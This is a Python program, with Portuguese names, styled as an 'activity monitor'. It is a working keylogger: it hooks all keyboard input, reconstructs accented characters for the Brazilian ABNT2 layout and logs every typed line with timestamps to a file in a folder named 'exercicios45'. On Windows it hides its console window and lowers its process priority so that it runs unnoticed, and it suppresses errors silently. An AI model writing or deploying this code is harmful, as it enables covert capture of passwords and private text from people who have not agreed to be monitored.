import keyboard
import time
import os
from datetime import datetime
import platform

if platform.system() == "Windows":
    import ctypes
    import win32gui
    import win32con
    import win32process
    import win32api

class MonitorAtividades:
    def __init__(self):
        self.buffer_linha = ""
        self.data_inicio = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
        self.pasta_logs = "exercicios45"
        self.arquivo_teclado = f"{self.pasta_logs}/teclado_{self.data_inicio}.txt"
        self.executando = True
        self.shift_pressionado = False
        self.acento_pendente = None
        self.posicao_linha_atual = 0
        
        self.acentos_combinaveis = {
            '´': {
                'a': 'á', 'e': 'é', 'i': 'í', 'o': 'ó', 'u': 'ú',
                'A': 'Á', 'E': 'É', 'I': 'Í', 'O': 'Ó', 'U': 'Ú'
            },
            '`': {
                'a': 'à', 'e': 'è', 'i': 'ì', 'o': 'ò', 'u': 'ù',
                'A': 'À', 'E': 'È', 'I': 'Ì', 'O': 'Ò', 'U': 'Ù'
            },
            '^': {
                'a': 'â', 'e': 'ê', 'i': 'î', 'o': 'ô', 'u': 'û',
                'A': 'Â', 'E': 'Ê', 'I': 'Î', 'O': 'Ô', 'U': 'Û'
            },
            '~': {
                'a': 'ã', 'o': 'õ', 'n': 'ñ',
                'A': 'Ã', 'O': 'Õ', 'N': 'Ñ'
            },
            '¨': {
                'a': 'ä', 'e': 'ë', 'i': 'ï', 'o': 'ö', 'u': 'ü',
                'A': 'Ä', 'E': 'Ë', 'I': 'Ï', 'O': 'Ö', 'U': 'Ü'
            }
        }
        
        self.inicializar_pastas()
        self.executar_em_segundo_plano()
        
    def inicializar_pastas(self):
        try:
            if not os.path.exists(self.pasta_logs):
                os.makedirs(self.pasta_logs)
            
            with open(self.arquivo_teclado, "w", encoding="utf-8") as f:
                f.write(f"Início do registro: {self.data_inicio}\n")
                f.write(f"Teclado: ABNT2 (Brasileiro)\n")
                f.write(f"="*70 + "\n\n")
                self.posicao_linha_atual = f.tell()
        except Exception as e:
            print(f"Erro ao inicializar pastas: {e}")
            
    def executar_em_segundo_plano(self):
        try:
            if platform.system() == "Windows":
                kernel32 = ctypes.WinDLL('kernel32')
                user32 = ctypes.WinDLL('user32')
                
                hwnd = kernel32.GetConsoleWindow()
                if hwnd:
                    user32.ShowWindow(hwnd, 0)
                
                try:
                    pid = win32process.GetCurrentProcessId()
                    handle = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, True, pid)
                    win32process.SetPriorityClass(handle, win32process.BELOW_NORMAL_PRIORITY_CLASS)
                except:
                    pass
        except Exception as e:
            try:
                with open(f"{self.pasta_logs}/erro_segundo_plano.txt", "w") as f:
                    f.write(f"Erro ao configurar segundo plano: {str(e)}")
            except:
                pass
    
    def atualizar_linha_atual(self):
        try:
            with open(self.arquivo_teclado, "r+", encoding="utf-8") as f:
                f.seek(self.posicao_linha_atual)
                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                linha_completa = f"[{timestamp}] {self.buffer_linha}"
                f.write(linha_completa)
                f.write(" " * 200)
                f.seek(self.posicao_linha_atual)
                f.write(linha_completa)
                f.truncate()
        except Exception as e:
            pass
    
    def finalizar_linha(self):
        try:
            with open(self.arquivo_teclado, "a", encoding="utf-8") as f:
                f.write("\n")
                self.posicao_linha_atual = f.tell()
            self.buffer_linha = ""
        except Exception as e:
            pass
    
    def callback_teclado(self, evento):
        try:
            nome = evento.name
            
            if nome == "backspace":
                if len(self.buffer_linha) > 0:
                    self.buffer_linha = self.buffer_linha[:-1]
                    self.atualizar_linha_atual()
                self.acento_pendente = None
                return
            
            teclas_mortas = ['´', '`', '^', '~', '¨', 'dead acute', 'dead grave', 'dead circumflex', 'dead tilde', 'dead diaeresis']
            
            if nome in teclas_mortas or nome in ['´', '`', '^', '~', '¨']:
                if nome == 'dead acute' or nome == '´':
                    self.acento_pendente = '´'
                elif nome == 'dead grave' or nome == '`':
                    self.acento_pendente = '`'
                elif nome == 'dead circumflex' or nome == '^':
                    self.acento_pendente = '^'
                elif nome == 'dead tilde' or nome == '~':
                    self.acento_pendente = '~'
                elif nome == 'dead diaeresis' or nome == '¨':
                    self.acento_pendente = '¨'
                else:
                    self.acento_pendente = nome
                return
            
            if self.acento_pendente:
                if self.acento_pendente in self.acentos_combinaveis:
                    if len(nome) == 1 and nome in self.acentos_combinaveis[self.acento_pendente]:
                        self.buffer_linha += self.acentos_combinaveis[self.acento_pendente][nome]
                        self.acento_pendente = None
                        self.atualizar_linha_atual()
                        return
                
                self.buffer_linha += self.acento_pendente
                self.acento_pendente = None
            
            mapeamento_teclas = {
                "space": " ",
                "enter": None,
                "tab": "[TAB]",
                "esc": "[ESC]",
                "caps lock": "[CAPS]",
                "delete": "[DEL]",
                "insert": "[INS]",
                "home": "[HOME]",
                "end": "[END]",
                "page up": "[PGUP]",
                "page down": "[PGDN]",
                "up": "[↑]",
                "down": "[↓]",
                "left": "[←]",
                "right": "[→]",
                "f1": "[F1]", "f2": "[F2]", "f3": "[F3]", "f4": "[F4]",
                "f5": "[F5]", "f6": "[F6]", "f7": "[F7]", "f8": "[F8]",
                "f9": "[F9]", "f10": "[F10]", "f11": "[F11]", "f12": "[F12]",
                "num lock": "[NUM]",
                "scroll lock": "[SCR]",
                "print screen": "[PRNT]",
                "pause": "[PAUSE]",
                "windows": "[WIN]",
                "left windows": "[WIN]",
                "right windows": "[WIN]",
                "apps": "[MENU]",
                "decimal": ",",
                "divide": "/",
                "multiply": "*",
                "subtract": "-",
                "add": "+",
                "ç": "ç",
                "Ç": "Ç",
            }
            
            if nome in ["shift", "right shift", "left shift"]:
                self.shift_pressionado = True
                return
            elif nome in ["ctrl", "right ctrl", "left ctrl"]:
                self.buffer_linha += "[CTRL]"
                self.atualizar_linha_atual()
                return
            elif nome in ["alt", "right alt", "left alt"]:
                self.buffer_linha += "[ALT]"
                self.atualizar_linha_atual()
                return
            elif nome.startswith("num "):
                numero = nome.replace("num ", "")
                self.buffer_linha += numero
                self.atualizar_linha_atual()
                return
            
            if nome == "enter":
                self.finalizar_linha()
            elif nome in mapeamento_teclas:
                valor = mapeamento_teclas[nome]
                if valor is not None:
                    self.buffer_linha += valor
                    self.atualizar_linha_atual()
            elif len(nome) == 1:
                self.buffer_linha += nome
                self.atualizar_linha_atual()
                
        except Exception as e:
            pass
    
    def callback_teclado_release(self, evento):
        try:
            nome = evento.name
            if nome in ["shift", "right shift", "left shift"]:
                self.shift_pressionado = False
        except:
            pass
        
    def encerrar_programa(self):
        try:
            self.executando = False
            
            try:
                with open(self.arquivo_teclado, "a", encoding="utf-8") as f:
                    if self.buffer_linha:
                        f.write("\n")
                    f.write(f"\n{'='*70}\n")
                    f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Programa encerrado\n")
            except:
                pass
            
            print(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - Monitor encerrado")
            
            time.sleep(0.5)
            os._exit(0)
        except Exception as e:
            print(f"Erro ao encerrar: {str(e)}")
            os._exit(1)

    def iniciar(self):
        try:
            keyboard.add_hotkey('shift+f6', self.encerrar_programa)
            keyboard.on_release(callback=self.callback_teclado)
            keyboard.on_release(callback=self.callback_teclado_release, suppress=False)
            
            print(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - Monitor iniciado")
            print(f"Teclado: ABNT2 - Salvamento em tempo real")
            print(f"Arquivo: {self.arquivo_teclado}")
            print(f"Pressione Shift+F6 para encerrar\n")
            
            while self.executando:
                try:
                    time.sleep(1)
                except KeyboardInterrupt:
                    self.encerrar_programa()
                    break
                except Exception as e:
                    pass
                
        except Exception as e:
            try:
                with open(f"{self.pasta_logs}/erro_execucao.txt", "w") as f:
                    f.write(f"Erro ao executar monitoramento: {str(e)}")
            except:
                pass
            print(f"Erro crítico: {str(e)}")

if __name__ == "__main__":
    try:
        monitor = MonitorAtividades()
        monitor.iniciar()
    except Exception as e:
        pasta_erro = "exercicios45"
        try:
            if not os.path.exists(pasta_erro):
                os.makedirs(pasta_erro)
            with open(f"{pasta_erro}/erro_critico.txt", "w") as f:
                f.write(f"Erro ao executar o programa: {str(e)}")
        except:
            pass
        print(f"Erro crítico ao iniciar: {str(e)}")